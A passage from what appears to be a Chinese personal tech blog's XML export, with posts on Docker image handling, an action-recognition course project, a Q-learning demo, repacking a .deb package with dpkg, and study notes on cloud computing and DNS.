class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker build -t waynamigo:webapp .</span><br><span class="line">生成后就可以创建容器并运行了</span><br><span class="line">docker run -p localhost:8080:8080 --name webapp_running  waynamigo:webapp</span><br></pre></td></tr></table></figure><ul><li>不放心的话可以进去康康<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker run -it waynamigo:webapp<span class="comment"># 运行这个docker容器</span></span><br><span class="line">top <span class="comment"># 看进程</span></span><br><span class="line">lsof -i:8080 <span class="comment"># 或者看端口占用</span></span><br></pre></td></tr></table></figure></li></ul><h2 id="保存镜像"><a href="#保存镜像" class="headerlink" title="保存镜像"></a>保存镜像</h2><ul><li><p>导出到本地，格式类似gcc++</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker save &lt;image&gt;:&lt;tag&gt; -o xxx.tar</span><br></pre></td></tr></table></figure></li><li><p>如果要重新导入，使用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker load -i xxx.tar</span><br><span class="line">docker load &lt; xxx.tar</span><br></pre></td></tr></table></figure></li></ul><h2 id="上传镜像"><a href="#上传镜像" class="headerlink" title="上传镜像"></a>上传镜像</h2><ul><li><del>还是git</del>，docker push</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">先commit</span><br><span class="line">docker commit -a &lt;authorName&gt; -m &lt;commitInfo&gt; &lt;containerId&gt; &lt;image&gt;:&lt;tag&gt; </span><br><span class="line"></span><br><span class="line">或者是单独打tag</span><br><span class="line">docker tag &lt;image&gt;:&lt;tag&gt; waynamigo/&lt;image&gt;:&lt;tag&gt;</span><br><span class="line">然后push</span><br><span class="line">docker push waynamigo/&lt;image&gt;:&lt;tag&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>学期项目-begining</title>
      <link href="/2019/03/06/2019-03-06-%E5%AD%A6%E6%9C%9F%E9%A1%B9%E7%9B%AE%E5%90%AF%E5%8A%A8/"/>
      <url>/2019/03/06/2019-03-06-%E5%AD%A6%E6%9C%9F%E9%A1%B9%E7%9B%AE%E5%90%AF%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<p>项目启动，本项目主要综合行为识别、目标检测、物体识别、文本情感分析进行开发.由于我负责行为识别和目标检测这一模块，只整理自己的工作内容</p><a id="more"></a><h2 id="Vision"><a href="#Vision" class="headerlink" title="Vision"></a>Vision</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Through image, video recognition, text recognition, the</span><br><span class="line">students&apos; words and deeds are processed by the system to determine whether it has adverse effects on public civilization.</span><br></pre></td></tr></table></figure><h2 id="Environment-Support"><a href="#Environment-Support" class="headerlink" title="Environment Support"></a>Environment Support</h2><ol><li>Keras 2.0/2.2</li><li>Tensorflow 1.2</li><li><del>Pytorch</del><h2 id="Main-References"><a href="#Main-References" class="headerlink" title="Main References"></a>Main References</h2>I GET THE set of papers from <a href="https://blog.csdn.net/whfshuaisi/article/details/79116265" target="_blank" rel="noopener"><strong>HERE</strong></a><br><a href="https://arxiv.org/pdf/1505.00487.pdf" target="_blank" rel="noopener">VIDEO TO TEXT</a><br><a href="https://arxiv.org/pdf/1411.4555.pdf" target="_blank" rel="noopener">IMAGE CAPTION</a><br><a href="https://arxiv.org/abs/1506.01497" target="_blank" rel="noopener">GET THE NAME FORM DETAIL F-CNN</a><br><a href="https://www.cv-foundation.org/openaccess/content_cvpr_2015/papers/Donahue_Long-Term_Recurrent_Convolutional_2015_CVPR_paper.pdf" target="_blank" rel="noopener">CVPR</a><h3 id="Two-stream"><a href="#Two-stream" class="headerlink" title="Two-stream"></a>Two-stream</h3>The development of my Action-Recgnization module is based on <a href="https://arxiv.org/abs/1406.2199" target="_blank" rel="noopener"><strong>Two Stream</strong></a> 《Two-StreamConvolutional Networks for Action  Recognition in Videos》.</li></ol><h3 id="Reasons-of-using-Two-stream"><a href="#Reasons-of-using-Two-stream" class="headerlink" title="Reasons of using Two-stream"></a>Reasons of using Two-stream</h3><p> The Action-Recgnization is developed on the way of Two-Stream recent years,And researchers have come out many papers on IEEE SCI and others.but the main reason is that I did Video caption last year, both of them are Analyzing Video Infomation, I want try other algorithm to finish my project in higher quality(<del>get higher score</del>). </p><h3 id="Procedure"><a href="#Procedure" class="headerlink" title="Procedure"></a>Procedure</h3><p>Graphviz</p><ul><li>using dot generate this picture<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul><p><strong>the basic of Two-Stream is The Fusion of spatiotemporal information in a dual stream network.</strong><br>or<br><strong>The KEY POINT is  the better Fusion of spatial and temporal features</strong></p><ul><li>The interaction between layers within a single network, such as ResNet/Inception.</li><li>between dual-stream networks, including the exploration of different fusion methods. It is worth considering the structure of ResNet and connecting the dual-stream network.</li></ul><p>This project use the second method.</p><h4 id="Spatial-network"><a href="#Spatial-network" class="headerlink" title="Spatial network"></a>Spatial network</h4><p>It mainly captures important object features in video frames.</p><h4 id="Time-series-network"><a href="#Time-series-network" class="headerlink" title="Time series network"></a>Time series network</h4><p>both of them : finetune the ImageNet</p><h2 id="Document-Quality-Attributes"><a href="#Document-Quality-Attributes" class="headerlink" title="Document-Quality Attributes"></a>Document-Quality Attributes</h2><p>Each contains:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">└── Avaliability(Quality Attributes eg.)</span><br><span class="line">     ├── Scenario</span><br><span class="line">     ├── Stimulus Source</span><br><span class="line">     ├── Stimulus</span><br><span class="line">     ├── Artifact</span><br><span class="line">     ├── Environment</span><br><span class="line">     ├── Response</span><br><span class="line">     ├── Response measure</span><br><span class="line">     └── Tactics</span><br></pre></td></tr></table></figure><table><thead><tr><th align="center"></th><th align="center">Avaliability</th><th align="center">Performance</th><th align="center">Modifiability</th><th align="center">Usability</th><th align="center">Security</th><th align="center">Testability</th></tr></thead><tbody><tr><td align="center">Scenario</td><td align="center">Can not identify bad behavior</td><td align="center">The exported files are shown well</td><td align="center">New demands&amp;Structural optimization</td><td align="center">Customers want to export statistics file easily and need a reliable data</td><td align="center">Databases  is intruded</td><td align="center">Unit testing</td></tr><tr><td align="center">Stimulus Source</td><td align="center">System dependencies</td><td align="center">Customers</td><td align="center">Developers and Customers</td><td align="center">Customers</td><td align="center">Attackers</td><td align="center">Developers</td></tr><tr><td align="center">Stimulus</td><td align="center">Can’t solve information of the video</td><td align="center">Exporting operation</td><td align="center">Customers</td><td align="center">Runtime(?)</td><td align="center">Sql injection&amp;entitlement</td><td align="center">Unit testing each module</td></tr><tr><td align="center">Artifact</td><td align="center">whole system</td><td align="center">UI</td><td align="center">system</td><td align="center">UI</td><td align="center">DBMS</td><td align="center">Code</td></tr><tr><td align="center">Environment</td><td align="center">Windows/Linux x86_64/32 in Runtime environment</td><td align="center">Web browser</td><td align="center">Runtime environment</td><td align="center">Web browser</td><td align="center">Firewall&amp;Encryption</td><td align="center">Runtime environment</td></tr><tr><td align="center">Response</td><td align="center">Send a feedback to backend if can’t analyze the video from surveillance cameras;Retry if can’t export the list of score</td><td align="center">Export statistics files in 10s</td><td align="center">Extend and modify functions when come out a new demand</td><td align="center">Provide a easy-operated UI and reliable information</td><td align="center">Resist intrusion</td><td align="center">Each module passed the Test Cases</td></tr><tr><td align="center">Response measure</td><td align="center">within 5min;within 5s</td><td align="center">within 10s</td><td align="center">All modules is extensible and under the control of the evaluation indexs</td><td align="center">The satisfaction of user</td><td align="center">Database is protected</td><td align="center">Developers</td></tr><tr><td align="center">Tactics</td><td align="center">Retry Self-test</td><td align="center">Increase Resource Efficiency</td><td align="center">Split Module</td><td align="center">aaa</td><td align="center">warm backup</td><td align="center">Limit Non-determinism</td></tr></tbody></table><h3 id="Project-Details"><a href="#Project-Details" class="headerlink" title="Project Details"></a>Project Details</h3><ul><li>This project explores prominent action recognition models with UCF-101 dataset</li><li>Perfomance of different models are compared and analysis of experiment results are provided</li></ul><h2 id="To-be-continued"><a href="#To-be-continued" class="headerlink" title="To be continued"></a>To be continued</h2>]]></content>
      
      
      <categories>
          
          <category> 深度学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> paper </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>强化学习DQN简介</title>
      <link href="/2019/03/02/2019-03-02-%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E5%88%9D%E6%AD%A5/"/>
      <url>/2019/03/02/2019-03-02-%E5%BC%BA%E5%8C%96%E5%AD%A6%E4%B9%A0%E5%88%9D%E6%AD%A5/</url>
      
        <content type="html"><![CDATA[<p>QLearing的算法目标是：达到reward最大的state（状态，以一个使用无监督学习环境的agent为例，自<a href="https://blog.csdn.net/qq_16234613/article/details/80268564" target="_blank" rel="noopener">https://blog.csdn.net/qq_16234613/article/details/80268564</a></p><a id="more"></a><h1 id="概念理解"><a href="#概念理解" class="headerlink" title="概念理解"></a>概念理解</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">预设值：首先将图中的每一条边预设reward，目标节点指向自己的邻接边的reward设100，其他设为0</span><br><span class="line">Q、R矩阵： 包括状态action和行为state，作为行列</span><br><span class="line">环境反馈: 对于每一次的episode （相当于迭代的东西），每一次尝试attemp，会根据反馈进行对网络更新</span><br><span class="line">环境更新.</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">R+r*max_Q(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">基本规则如下：</span><br><span class="line">Q表内容为index--state（agent的位置），columns--action(行为集)</span><br><span class="line">Q表（记录行为值）的计算规则是每次对于行为集合中的每一个action，对其进行计算、并进行选择。</span><br><span class="line">每一次episode，Q表更新一次</span><br><span class="line">定义EPSILON的目的是控制贪婪程度，其中，它可以随着时间推移 逐渐增加，贪婪)</span><br></pre></td></tr></table></figure><ul><li>主循环：图示<figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/2-1-1.png)" alt title>                </div>                <div class="image-caption"></div>            </figure></li></ul><p>首先要对其评估和更新准则进行确定，代码中表示可以直接定义在一个结构中。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">update_env</span><span class="params">(S, episode, step_counter)</span>:</span></span><br><span class="line">    <span class="comment"># This is how environment be updated</span></span><br><span class="line">    env_list = [<span class="string">'-'</span>]*(N_STATES<span class="number">-1</span>) + [<span class="string">'T'</span>]   <span class="comment"># '---------T' our environment</span></span><br><span class="line">    <span class="keyword">if</span> S == <span class="string">'terminal'</span>:</span><br><span class="line">        interaction = <span class="string">'Episode %s: total_steps = %s'</span> % (episode+<span class="number">1</span>, step_counter)</span><br><span class="line">        print(<span class="string">'\r&#123;&#125;'</span>.format(interaction), end=<span class="string">''</span>)</span><br><span class="line">        time.sleep(<span class="number">2</span>)</span><br><span class="line">        print(<span class="string">'\r                                '</span>, end=<span class="string">''</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        env_list[S] = <span class="string">'o'</span></span><br><span class="line">        interaction = <span class="string">''</span>.join(env_list)</span><br><span class="line">        print(<span class="string">'\r&#123;&#125;'</span>.format(interaction), end=<span class="string">''</span>)</span><br><span class="line">        time.sleep(FRESH_TIME)</span><br></pre></td></tr></table></figure><h2 id="demo-参考莫烦python的一个例子"><a href="#demo-参考莫烦python的一个例子" class="headerlink" title="demo,参考莫烦python的一个例子"></a>demo,参考莫烦python的一个例子</h2><p>预先设置的参数，就是上述的预设值，其中gamma参数是作为奖励递减值，作用见后文代码，它是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">N_STATES =  <span class="comment">#1维宽度</span></span><br><span class="line">ACTIONS =  <span class="comment">#动作集合</span></span><br><span class="line">EPSILON = <span class="comment">#greedy贪婪值</span></span><br><span class="line">ALPHA =  <span class="comment"># learning rate 学习率</span></span><br><span class="line">GAMMA =  <span class="comment"># discount factor 奖励递减值</span></span><br><span class="line">MAX_EPISODES =  <span class="comment"># maximum episodes 最大回合数</span></span><br></pre></td></tr></table></figure><p>Q表的行和列存储action和state，它的Value 每一次更新就是更新它的<strong>行为准则</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_q_table</span><span class="params">(n_states, actions)</span>:</span></span><br><span class="line">    table = pd.DataFrame(</span><br><span class="line">        np.zeros((n_states, len(actions))),</span><br><span class="line">        columns=actions,</span><br><span class="line">    )</span><br><span class="line">    <span class="keyword">return</span> table</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Reinforcement Learing </category>
          
      </categories>
      
      
        <tags>
            
            <tag> paper </tag>
            
            <tag> DQN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>解决软件源更新，旧版本软件应用无法使用的问题</title>
      <link href="/2019/01/17/2019-01-17-%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E4%BF%AE%E6%94%B9deb%E4%BE%9D%E8%B5%96/"/>
      <url>/2019/01/17/2019-01-17-%E7%BD%91%E6%98%93%E4%BA%91%E9%9F%B3%E4%B9%90%E4%BF%AE%E6%94%B9deb%E4%BE%9D%E8%B5%96/</url>
      
        <content type="html"><![CDATA[<p>简单的修改官方deb依赖的操作例子，以修改网易云音乐debian包为例</p><a id="more"></a><hr><h1 id="查看软件包里的文件内容-不必要，只是避免好久不用忘了参数"><a href="#查看软件包里的文件内容-不必要，只是避免好久不用忘了参数" class="headerlink" title="查看软件包里的文件内容(不必要，只是避免好久不用忘了参数"></a>查看软件包里的文件内容(不必要，只是避免好久不用忘了参数</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg -c neteasemusic.deb</span><br></pre></td></tr></table></figure><h1 id="用dpkg解压"><a href="#用dpkg解压" class="headerlink" title="用dpkg解压"></a>用dpkg解压</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将软件包中的文件释放到extracted目录下</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg-deb -x neteasemusic.deb extracted/</span><br></pre></td></tr></table></figure><h1 id="解压deb包中DEBIAN目录下的文件"><a href="#解压deb包中DEBIAN目录下的文件" class="headerlink" title="解压deb包中DEBIAN目录下的文件"></a>解压deb包中DEBIAN目录下的文件</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将主控信息解压，control中包括了所有依赖</span><br></pre></td></tr></table></figure><ul><li>dpkg创建包的时候，依赖的控制信息在DEBIAN文件夹中，所以首先要创建一个DEBIAN文件夹（大写</li></ul><p>否则会出现错误</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg-deb: error: failed to open package info file <span class="string">'build//DEBIAN/control'</span> <span class="keyword">for</span> reading: No such file or directory</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg-deb -e neteasemusic.deb extracted/DEBIAN</span><br></pre></td></tr></table></figure><h1 id="创建debian软件包"><a href="#创建debian软件包" class="headerlink" title="创建debian软件包"></a>创建debian软件包</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpkg-deb -b extract/ ./</span><br></pre></td></tr></table></figure><h1 id="参数如下"><a href="#参数如下" class="headerlink" title="参数如下"></a>参数如下</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">* -c：显示软件包中的文件列表；</span><br><span class="line">* -e：将主控信息解压；</span><br><span class="line">* -f：把字段内容打印到标准输出；</span><br><span class="line">* -x：将软件包中的文件释放到指定目录下；</span><br><span class="line">* -X：将软件包中的文件释放到指定目录下，并显示释放文件的详细过程；</span><br><span class="line">* -w：显示软件包的信息；</span><br><span class="line">* -l：显示软件包的详细信息；</span><br><span class="line">* -R：提取控制信息和存档的清单文件；</span><br><span class="line">* -b：创建debian软件包。</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 其他 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> debian </tag>
            
            <tag> dpkg </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>云计算复习</title>
      <link href="/2019/01/08/2019-01-08-%E4%BA%91%E8%AE%A1%E7%AE%97/"/>
      <url>/2019/01/08/2019-01-08-%E4%BA%91%E8%AE%A1%E7%AE%97/</url>
      
        <content type="html"><![CDATA[<p>云计算概论</p><a id="more"></a><hr><h1 id="绪论"><a href="#绪论" class="headerlink" title="绪论"></a>绪论</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* 云计算的定义</span><br><span class="line">* 云计算的人群</span><br></pre></td></tr></table></figure><h2 id="云计算的特征"><a href="#云计算的特征" class="headerlink" title="云计算的特征"></a>云计算的特征</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">超大规模</span><br><span class="line">高可扩展性</span><br><span class="line">虚拟化</span><br><span class="line">高可靠性</span><br><span class="line">通用性</span><br><span class="line">廉价性</span><br><span class="line">灵活定制</span><br></pre></td></tr></table></figure><h2 id="云计算的优点"><a href="#云计算的优点" class="headerlink" title="云计算的优点"></a>云计算的优点</h2><ul><li>虚拟化技术</li><li>动态可扩展</li><li>按需部署</li><li>高灵活性</li><li>高可靠性</li><li>高性价比</li></ul><table><thead><tr><th align="center">优点</th><th align="center">缺点</th></tr></thead><tbody><tr><td align="center">降低用户计算机的成本</td><td align="center">要求持续的网络连接</td></tr><tr><td align="center">改善性能</td><td align="center">低带宽网络连接环境下不能很好地工作</td></tr><tr><td align="center">降低IT基础设施投资</td><td align="center">反应慢</td></tr><tr><td align="center">减少维护问题</td><td align="center"></td></tr><tr><td align="center">减少软件开支</td><td align="center"></td></tr><tr><td align="center">即时的软件更新</td><td align="center"></td></tr><tr><td align="center">计算能力的增长</td><td align="center">功能有限制</td></tr><tr><td align="center">无限的存储能力</td><td align="center"></td></tr><tr><td align="center">增强的数据安全性</td><td align="center">无法确保数据的安全性</td></tr><tr><td align="center">改善操作系统的兼容性</td><td align="center"></td></tr><tr><td align="center">改善文档格式的兼容性</td><td align="center">不能保证数据不会丢失</td></tr><tr><td align="center">简化团队协作</td><td align="center"></td></tr><tr><td align="center">没有地点限制的数据获取</td><td align="center"></td></tr><tr><td align="center">绿色计算思想的实现者</td><td align="center"></td></tr></tbody></table><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><p>服务类型： 基础设施、平台、应用<br>部署范围： 公有、私有、混合</p><ul><li>并行计算、分布式计算、网格计算属于计算科学</li><li>云计算、效用计算属于计算模式、商业模式<h2 id="与网格计算的区别："><a href="#与网格计算的区别：" class="headerlink" title="与网格计算的区别："></a>与网格计算的区别：</h2></li><li>网格是共享资源、协同计算，是一种资源共享模型。</li><li>而云计算采用网络将集群资源连接在一起，单向提供给用户资源进行数据处理。</li><li><strong>资源调度模式</strong> ：云计算以数据为中心，采用集群存储管理资源；网格计算以计算为中心，资源分布在各地。云计算进一步将硬件虚拟化。<h2 id="云计算体系结构"><a href="#云计算体系结构" class="headerlink" title="云计算体系结构"></a>云计算体系结构</h2>IaaS、PaaS、SaaS</li><li>infrastructure asa service： 硬件 资源</li><li>platform asa service： 软件环境</li><li>software asa service：应用程序</li></ul><figure class="image-bubble">                <div class="img-lightbox">                    <div class="overlay"></div>                    <img src="/img/IPS.png" alt title>                </div>                <div class="image-caption"></div>            </figure><h2 id="云存储结构-GFS-Google-File-System-HDFS-Hadoop-Distributed-File-System"><a href="#云存储结构-GFS-Google-File-System-HDFS-Hadoop-Distributed-File-System" class="headerlink" title="云存储结构 GFS (Google File System) HDFS(Hadoop Distributed File System)"></a>云存储结构 GFS (Google File System) HDFS(Hadoop Distributed File System)</h2><ul><li>存储层</li><li>基础管理层</li><li>应用接口层</li><li>访问层<h2 id="云计算技术体系结构"><a href="#云计算技术体系结构" class="headerlink" title="云计算技术体系结构"></a>云计算技术体系结构</h2></li><li>物理资源层：计算机、存储器、网络设施、数据库、软件</li><li>资源池层：将大量相同类型的资源构成资源池</li><li>管理中间件层： 资源管理、任务管理、用户管理、安全管理</li><li>SOA(Service-Oriented Architecture）构建层：将云计算能力封装成标准的Web Services</li></ul><h2 id="云计算的两条底层技术路线"><a href="#云计算的两条底层技术路线" class="headerlink" title="云计算的两条底层技术路线"></a>云计算的两条底层技术路线</h2><ul><li>分布式计算：把一个任务分解成多个小人物，在不同的服务器进行计算，整合计算资源</li></ul><ul><li><p>虚拟化：提供Iaas虚机，分割计算资源</p><h2 id="VMM的分类-VMM-virtual-machine-monitor-虚拟化核心软件"><a href="#VMM的分类-VMM-virtual-machine-monitor-虚拟化核心软件" class="headerlink" title="VMM的分类 VMM(virtual machine monitor)虚拟化核心软件"></a>VMM的分类 VMM(virtual machine monitor)虚拟化核心软件</h2><p>管理虚拟环境、管理物理资源</p></li><li><p>所谓虚拟化，是指通过虚拟化技术将一台计算机虚拟为多台逻辑计算机</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">虚拟化就是由位于下层的软件模块,通过向上一层软件模块</span><br><span class="line">提供一个与它原先所期待的运行环境 完全一致 的接口的方法,</span><br><span class="line">抽象出一个虚拟的软件或硬件接口,使得上层软件可以直接运行在虚拟环境上。</span><br></pre></td></tr></table></figure></li><li><p>虚拟化的优点:封装(逻辑化)\多实例–计算资源的充分利用率、绿色节能、降低成本\隔离\硬件兼容\虚拟化层特权</p></li><li><p>虚拟化的缺点:性能错误安全影响复杂：虚拟化层的引入增加了系统出错层面(如有些驱动无法加载)</p></li><li><p>虚拟平台：完全虚拟化 半虚拟化</p></li><li><p>实现结构 ：Hypervisor模型宿主模型混合模型</p><h2 id="IO虚拟化"><a href="#IO虚拟化" class="headerlink" title="IO虚拟化"></a>IO虚拟化</h2></li><li><p>发现虚拟设备</p></li><li><p>虚机加载驱动，通过vmm提供的后端接口驱动设备</p></li><li><p>后端驱动程序调用物理驱动程序管理物理IO设备</p></li></ul><p>设备模型指VMM中进行设备模拟,并处理所有设备请求和响应的逻辑模块</p><h2 id="ssh原理"><a href="#ssh原理" class="headerlink" title="ssh原理"></a>ssh原理</h2><ul><li><p>客户端向服务器端发出连接请求</p></li><li><p>服务器端向客户端发出自己的公钥</p></li><li><p>客户端使用服务器端的公钥加密通讯密钥然后发给服务器端</p></li><li><p>如果通讯过程被截获,由于窃听者即使获知公钥和经过公钥加密的内容,但不拥有私钥依然无法解密(RSA算法)</p></li><li><p>服务器端接收到密文后,用私钥解密,获知通讯密钥</p></li><li><p>ssh-keygen命令给服务器端产生公私钥密钥对</p></li><li><h2 id="Hadoop"><a href="#Hadoop" class="headerlink" title="Hadoop"></a>Hadoop</h2></li><li><p>HDFS</p></li><li><p>NameNode</p></li><li><p>DataNode</p></li><li><p>事务日志</p></li><li><p>映像文件</p></li><li><p>SecondaryNameNode</p></li><li><p>读取数据流程</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">客户端要访问HDFS中的一个文件</span><br><span class="line">首先从namenode获得组成这个文件的数据块位置列表</span><br><span class="line">根据列表知道存储数据块的datanode</span><br><span class="line">访问datanode获取数据</span><br><span class="line">Namenode并不参与数据实际传输</span><br></pre></td></tr></table></figure></li><li><p>冗余副本策略,所有数据块都有副本</p></li><li><p>心跳机制，保证数据一致性</p></li><li><p>机架策略</p></li></ul><h2 id="Hbase"><a href="#Hbase" class="headerlink" title="Hbase"></a>Hbase</h2><ul><li><p>HBase是一个分布式的、面向列的开源数据库</p></li><li><p>适合于非结构化数据存储的数据库</p></li><li><p>行键是数据行在表里的唯一标识</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* 以表的形式存放数据</span><br><span class="line">* 表由行与列组成,每个列属于某个列族,由行和列确定的存储单元称为元素</span><br><span class="line">* 每个元素保存了同一份数据的多个版本,由时间戳来标识区分</span><br></pre></td></tr></table></figure></li><li><p>列表示为&lt;列族&gt;:&lt;限定符&gt;</p></li><li><p>Hbase在磁盘上按照列族存储数据,这种列式数据库的设计非常适合于数据分析</p></li><li><p>列族里的元素最好具有相同的读写方式(例如等长的字符串),以提高性能，可压缩</p><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2></li><li><p>把Linux的cgroup、namespace,chroot等容器底层技术进行封装抽象,为用户提供了创建和管理容器的便捷界面</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 复习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> review </tag>
            
            <tag> Cloud Computing </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络原理应用层复习</title>
      <link href="/2019/01/07/2019-01-07-%E5%BA%94%E7%94%A8%E5%B1%82/"/>
      <url>/2019/01/07/2019-01-07-%E5%BA%94%E7%94%A8%E5%B1%82/</url>
      
        <content type="html"><![CDATA[<p>运输层是两个进程之间的逻辑通信，网络层是为主机之间提供逻辑通信，运输层负责对报文差错检测</p><a id="more"></a><ul><li>域名系统 DNS</li><li>文件传送协议</li><li>远程终端协议 TELNET</li><li>万维网 WWW</li><li>电子邮件</li><li>动态主机配置协议 DHCP</li><li>P2P 应用</li></ul><hr><p>#总结</p><ul><li>国家顶级域名 nTLD</li><li>通用顶级域名 gTLD</li><li>基础结构域名 (infrastructure domain)，<em>顶级域名只有一个,即 arpa</em></li><li>一个服务器所负责管辖的(或有权限的)范围叫<strong>区 (zone)</strong>。</li><li>每一个区设置相应的权限域名服务器,用来保存该区中的所有主机的域名到 IP 地址的映射。<br>根域名服务器共有 13 套装置,不是 13 个机器</li><li>可靠性：DNS 域名服务器都把数据复制到几个域名服务器来保存,其中的一个是主域名服务器,其他<br>的是辅助域名服务器<h2 id="域名服务器"><a href="#域名服务器" class="headerlink" title="域名服务器"></a>域名服务器</h2></li><li>根域名服务器 最高层次的域名服务器,也是最重要的域名服务器。所有的根域名服务器都知道所有的顶级域名服务器的域名和 IP 地址<br>a.rootservers.net<br>b.rootservers.net</li><li>顶级域名服务器</li><li>权限域名服务器</li><li>本地域名服务器<h2 id="域名的解析过程"><a href="#域名的解析过程" class="headerlink" title="域名的解析过程"></a>域名的解析过程</h2></li><li>主机向本地域名服务器的查询一般都是采用递归查询</li><li>本地域名服务器向根域名服务器的查询通常是采用迭代查询。<h3 id="高速缓存"><a href="#高速缓存" class="headerlink" title="高速缓存"></a>高速缓存</h3></li><li><em>每个域名服务器都维护一个高速缓存*</em> ,存放最近用过<br>的名字以及从何处获得名字映射信息的记录</li></ul><hr><h1 id="文件传输-文件传送协议-FTP-File-Transfer-Protocol"><a href="#文件传输-文件传送协议-FTP-File-Transfer-Protocol" class="headerlink" title="文件传输 文件传送协议 FTP (File Transfer Protocol)"></a>文件传输 文件传送协议 FTP (File 